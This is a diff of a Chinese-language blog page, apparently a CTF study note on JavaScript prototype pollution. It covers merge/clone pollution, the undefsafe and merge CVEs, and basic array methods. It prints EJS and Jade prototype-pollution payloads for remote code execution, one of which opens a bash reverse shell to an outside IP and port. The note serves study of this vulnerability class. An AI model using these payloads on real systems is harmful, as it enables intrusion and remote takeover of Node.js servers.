 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">object1</span>.<span style="color:#58a1dd">__proto__</span>.<span style="color:#58a1dd">foo</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;Hello World&#34;</span>;
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object1</span>.<span style="color:#58a1dd">foo</span>);
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">object2</span> <span style="color:#ff636f">=</span> {<span style="color:#a6be9d">&#34;c&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">1</span>, <span style="color:#a6be9d">&#34;d&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">2</span>};
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object2</span>.<span style="color:#58a1dd">foo</span>);</span></span></code></pre></div><p>o1 和 o2 相当于继承了Object.prototype 所以当我们对一个对象设置foo属性 就造成了原型链污染 导致Object2 也拥有了foo属性</p>
-<h5 id="产生原因" class="heading-element"><span>0.0.0.3  产生原因</span>
+<h1 id="产生原因" class="heading-element"><span>产生原因</span>
   <a href="#%e4%ba%a7%e7%94%9f%e5%8e%9f%e5%9b%a0" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>如果 我们需要利用原型链污染 那我们就需要设置 <strong><code>__proto__</code></strong> 的值 也就是需要找到能控制数组的键名的操作 最常见的就是merge clone copy</p>
+</h1><p>如果 我们需要利用原型链污染 那我们就需要设置 <strong><code>__proto__</code></strong> 的值 也就是需要找到能控制数组的键名的操作 最常见的就是merge clone copy</p>
 <p><code>merge</code>方法 是合并对象的方法 合并两个对象或者 多个对象的属性</p>
 <p><code>clone</code>方法 就是克隆捏</p>
 <p>这里的merge换成copy也是污染</p>
@@ -440,24 +472,24 @@ Function(arg0, arg1, /* … ,*/ argN, functionBody) 作者：J_Chanra https://ww
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">undefined</span></span></span></code></pre></div><p>向上面这么写 最后会完成污染 这是因为 json解析的时候 <strong>proto</strong>会被认为成一个真正的键名 而不代表原型 所以在遍历o2的时候 会存在这个键。ps:前面用的<code>let o2 = {a: 1, &quot;__proto__&quot;: {b: 2}}</code></p>
 <p>但是 我们输出a 为undefined，上面o1 o2 输出a为1 是因为 merge对二者进行了融合 但是并没有进行污染</p>
 <p>这里也能比较清晰的认识到污染</p>
-<h5 id="漏洞利用" class="heading-element"><span>0.0.0.4  漏洞利用</span>
+<h1 id="漏洞利用" class="heading-element"><span>漏洞利用</span>
   <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="ejs模板rce" class="heading-element"><span>0.0.0.4.1  ejs模板rce</span>
+</h1><h2 id="ejs模板rce" class="heading-element"><span>ejs模板rce</span>
   <a href="#ejs%e6%a8%a1%e6%9d%bfrce" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><a href="https://www.bilibili.com/read/cv20929156"target="_blank" rel="external nofollow noopener noreferrer">https://www.bilibili.com/read/cv20929156</a></p>
+</h2><p><a href="https://www.bilibili.com/read/cv20929156"target="_blank" rel="external nofollow noopener noreferrer">https://www.bilibili.com/read/cv20929156</a></p>
 <p>EJS 是一套简单的模板语言，设计的初衷是用尽可能少的js代码，渲染出丰富的html页面。</p>
 <p>poc</p>
 <pre tabindex="0"><code>{&#34;__proto__&#34;:{&#34;__proto__&#34;:{&#34;outputFunctionName&#34;:&#34;_tmp1;console.log(123);var __tmp2&#34;}}}
 
-{&#34;__proto__&#34;:{&#34;__proto__&#34;:{&#34;outputFunctionName&#34;:&#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/8.130.69.158/7788 0&gt;&amp;1\&#34;&#39;);var __tmp2&#34;}}}</code></pre><h6 id="jade" class="heading-element"><span>0.0.0.4.2  JADE</span>
+{&#34;__proto__&#34;:{&#34;__proto__&#34;:{&#34;outputFunctionName&#34;:&#34;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/8.130.69.158/7788 0&gt;&amp;1\&#34;&#39;);var __tmp2&#34;}}}</code></pre><h2 id="jade" class="heading-element"><span>JADE</span>
   <a href="#jade" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><a href="https://xz.aliyun.com/t/7025#toc-2"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/7025#toc-2</a></p>
+</h2><p><a href="https://xz.aliyun.com/t/7025#toc-2"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/7025#toc-2</a></p>
 <p><a href="https://tari.moe/p/2021/ctfshow-nodejs#c869ae41c9ab4f08948195242a67266e"target="_blank" rel="external nofollow noopener noreferrer">https://tari.moe/p/2021/ctfshow-nodejs#c869ae41c9ab4f08948195242a67266e</a></p>
 <p>ctfshow342</p>
 <p>常见 Express 模板引擎有(包括但不限于如下)：</p>
@@ -476,11 +508,11 @@ Function(arg0, arg1, /* … ,*/ argN, functionBody) 作者：J_Chanra https://ww
 
 {&#34;__proto__&#34;:{&#34;self&#34;:&#34;true&#34;,&#34;line&#34;:&#34;2,jade_debug[0].filename));return global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;)//&#34;}}
 
-{&#34;__proto__&#34;:{&#34;self&#34;:1,&#34;line&#34;:&#34;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;)&#34;}}</code></pre><h6 id="undefsafe-模块原型链污染cve-2019-10795" class="heading-element"><span>0.0.0.4.3  Undefsafe 模块原型链污染（CVE-2019-10795）</span>
+{&#34;__proto__&#34;:{&#34;self&#34;:1,&#34;line&#34;:&#34;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;)&#34;}}</code></pre><h2 id="undefsafe-模块原型链污染cve-2019-10795" class="heading-element"><span>Undefsafe 模块原型链污染（CVE-2019-10795）</span>
   <a href="#undefsafe-%e6%a8%a1%e5%9d%97%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93cve-2019-10795" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">object</span> <span style="color:#ff636f">=</span> {
+</h2><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">object</span> <span style="color:#ff636f">=</span> {
 </span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">a</span><span style="color:#ff636f">:</span> {
 </span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">b</span><span style="color:#ff636f">:</span> {
 </span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">c</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">1</span>,
@@ -551,12 +583,15 @@ Function(arg0, arg1, /* … ,*/ argN, functionBody) 作者：J_Chanra https://ww
 <p>在2.0.3后的版本 加上了下面的限制</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292228807.webp" alt="image-20230729222823558" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292228807.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292228807.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307292228807.webp?size=large 2x" data-title="image-20230729222823558" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>应该是 对于其修改Object中本身的属性 做出了限制 所以 不能进行污染了</p>
-<h6 id="审计" class="heading-element"><span>0.0.0.4.4  审计</span>
+<h2 id="审计" class="heading-element"><span>审计</span>
   <a href="#%e5%ae%a1%e8%ae%a1" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>####### split()</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">splitStr</span>(<span style="color:#58a1dd">str</span>, <span style="color:#58a1dd">separator</span>) {
+</h2><h3 id="split" class="heading-element"><span>split()</span>
+  <a href="#split" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">splitStr</span>(<span style="color:#58a1dd">str</span>, <span style="color:#58a1dd">separator</span>) {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#828b96;font-style:italic">// Function to split string
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>    <span style="color:#ff636f">var</span> <span style="color:#58a1dd">string</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">str</span>.<span style="color:#58a1dd">split</span>(<span style="color:#58a1dd">separator</span>);
@@ -573,8 +608,11 @@ Function(arg0, arg1, /* … ,*/ argN, functionBody) 作者：J_Chanra https://ww
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">splitStr</span>(<span style="color:#58a1dd">str</span>, <span style="color:#58a1dd">separator</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">Output</span><span style="color:#ff636f">:</span>
-</span></span><span style="display:flex;"><span>[ <span style="color:#a6be9d">&#39;GeeksforGeeks&#39;</span>, <span style="color:#a6be9d">&#39;A&#39;</span>, <span style="color:#a6be9d">&#39;computer&#39;</span>, <span style="color:#a6be9d">&#39;science&#39;</span>, <span style="color:#a6be9d">&#39;portal&#39;</span> ]</span></span></code></pre></div><p>####### Array.prototype.filter()</p>
-<p><strong><code>filter()</code></strong> 方法會建立一個經指定之函式運算後，由原陣列中通過該函式檢驗之元素所構成的新陣列。</p>
+</span></span><span style="display:flex;"><span>[ <span style="color:#a6be9d">&#39;GeeksforGeeks&#39;</span>, <span style="color:#a6be9d">&#39;A&#39;</span>, <span style="color:#a6be9d">&#39;computer&#39;</span>, <span style="color:#a6be9d">&#39;science&#39;</span>, <span style="color:#a6be9d">&#39;portal&#39;</span> ]</span></span></code></pre></div><h3 id="arrayprototypefilter" class="heading-element"><span>Array.prototype.filter()</span>
+  <a href="#arrayprototypefilter" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><strong><code>filter()</code></strong> 方法會建立一個經指定之函式運算後，由原陣列中通過該函式檢驗之元素所構成的新陣列。</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">words</span> <span style="color:#ff636f">=</span> [<span style="color:#a6be9d">&#39;spray&#39;</span>, <span style="color:#a6be9d">&#39;limit&#39;</span>, <span style="color:#a6be9d">&#39;elite&#39;</span>, <span style="color:#a6be9d">&#39;exuberant&#39;</span>, <span style="color:#a6be9d">&#39;destruction&#39;</span>, <span style="color:#a6be9d">&#39;present&#39;</span>];
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">result</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">words</span>.<span style="color:#58a1dd">filter</span>(<span style="color:#58a1dd">word</span> =&gt; <span style="color:#58a1dd">word</span>.<span style="color:#58a1dd">length</span> <span style="color:#ff636f">&gt;</span> <span style="color:#a6be9d">6</span>);
@@ -582,8 +620,11 @@ Function(arg0, arg1, /* … ,*/ argN, functionBody) 作者：J_Chanra https://ww
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">result</span>);
 </span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// expected output: Array [&#34;exuberant&#34;, &#34;destruction&#34;, &#34;present&#34;]
 </span></span></span></code></pre></div><p>相当于一个 过滤器</p>
-<p>####### Array.prototype.slice()</p>
-<p><strong><code>slice()</code></strong> 方法會回傳一個新陣列物件，為原陣列選擇之 <code>begin</code> 至 <code>end</code>（不含 <code>end</code>）部分的淺拷貝（shallow copy）。而原本的陣列將不會被修改。</p>
+<h3 id="arrayprototypeslice" class="heading-element"><span>Array.prototype.slice()</span>
+  <a href="#arrayprototypeslice" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><strong><code>slice()</code></strong> 方法會回傳一個新陣列物件，為原陣列選擇之 <code>begin</code> 至 <code>end</code>（不含 <code>end</code>）部分的淺拷貝（shallow copy）。而原本的陣列將不會被修改。</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">animals</span> <span style="color:#ff636f">=</span> [<span style="color:#a6be9d">&#39;ant&#39;</span>, <span style="color:#a6be9d">&#39;bison&#39;</span>, <span style="color:#a6be9d">&#39;camel&#39;</span>, <span style="color:#a6be9d">&#39;duck&#39;</span>, <span style="color:#a6be9d">&#39;elephant&#39;</span>];
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">animals</span>.<span style="color:#58a1dd">slice</span>(<span style="color:#a6be9d">2</span>));
@@ -604,8 +645,11 @@ Function(arg0, arg1, /* … ,*/ argN, functionBody) 作者：J_Chanra https://ww
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">animals</span>.<span style="color:#58a1dd">slice</span>());
 </span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// expected output: Array [&#34;ant&#34;, &#34;bison&#34;, &#34;camel&#34;, &#34;duck&#34;, &#34;elephant&#34;]
 </span></span></span></code></pre></div><p>这是相当于一个数组切割的工具</p>
-<p>####### Array.prototype.join()</p>
-<p>join() 方法會將陣列（或一個類陣列（array-like）物件）中所有的元素連接、合併成一個字串，並回傳此字串。</p>
+<h3 id="arrayprototypejoin" class="heading-element"><span>Array.prototype.join()</span>
+  <a href="#arrayprototypejoin" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>join() 方法會將陣列（或一個類陣列（array-like）物件）中所有的元素連接、合併成一個字串，並回傳此字串。</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">elements</span> <span style="color:#ff636f">=</span> [<span style="color:#a6be9d">&#39;Fire&#39;</span>, <span style="color:#a6be9d">&#39;Air&#39;</span>, <span style="color:#a6be9d">&#39;Water&#39;</span>];
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">elements</span>.<span style="color:#58a1dd">join</span>());
@@ -616,11 +660,11 @@ Function(arg0, arg1, /* … ,*/ argN, functionBody) 作者：J_Chanra https://ww
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">elements</span>.<span style="color:#58a1dd">join</span>(<span style="color:#a6be9d">&#39;-&#39;</span>));
 </span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// expected output: &#34;Fire-Air-Water&#34;
-</span></span></span></code></pre></div><h6 id="merge类操作导致原型链污染" class="heading-element"><span>0.0.0.4.5  Merge类操作导致原型链污染</span>
+</span></span></span></code></pre></div><h2 id="merge类操作导致原型链污染" class="heading-element"><span>Merge类操作导致原型链污染</span>
   <a href="#merge%e7%b1%bb%e6%93%8d%e4%bd%9c%e5%af%bc%e8%87%b4%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>原型链污染的主要思想 实际上就是寻找能够操纵键值的位置 然后利用<strong>proto</strong>来向上污染</p>
+</h2><p>原型链污染的主要思想 实际上就是寻找能够操纵键值的位置 然后利用<strong>proto</strong>来向上污染</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">const</span> <span style="color:#58a1dd">merge</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">a</span>, <span style="color:#58a1dd">b</span>) =&gt; {    <span style="color:#828b96;font-style:italic">// 发现 merge 危险操作
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span>  <span style="color:#ff636f">for</span> (<span style="color:#ff636f">var</span> <span style="color:#58a1dd">attr</span> <span style="color:#ff636f">in</span> <span style="color:#58a1dd">b</span>) {
 </span></span><span style="display:flex;"><span>    <span style="color:#ff636f">if</span> (<span style="color:#58a1dd">isObject</span>(<span style="color:#58a1dd">a</span>[<span style="color:#58a1dd">attr</span>]) <span style="color:#ff636f">&amp;&amp;</span> <span style="color:#58a1dd">isObject</span>(<span style="color:#58a1dd">b</span>[<span style="color:#58a1dd">attr</span>])) {
@@ -676,11 +720,11 @@ Function(arg0, arg1, /* … ,*/ argN, functionBody) 作者：J_Chanra https://ww
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">object2</span> <span style="color:#ff636f">=</span> {}
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">object2</span>.<span style="color:#58a1dd">b</span>)</span></span></code></pre></div><p>clone 也是一样的</p>
-<h6 id="mergerecursivemerge-cve-2020-28499" class="heading-element"><span>0.0.0.4.6  merge.recursiveMerge CVE-2020-28499</span>
+<h2 id="mergerecursivemerge-cve-2020-28499" class="heading-element"><span>merge.recursiveMerge CVE-2020-28499</span>
   <a href="#mergerecursivemerge-cve-2020-28499" class="heading-mark">
